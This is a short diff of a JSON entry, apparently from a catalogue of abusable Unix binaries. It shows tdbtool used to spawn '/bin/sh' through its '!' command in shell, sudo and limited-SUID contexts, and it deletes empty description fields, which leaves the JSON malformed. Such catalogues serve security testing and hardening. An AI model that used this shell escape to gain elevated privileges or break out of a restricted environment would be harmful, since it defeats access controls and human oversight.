@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "tdbtool\n! /bin/sh\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo tdbtool\n! /bin/sh\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./tdbtool\n! /bin/sh\n"
       }
     ]
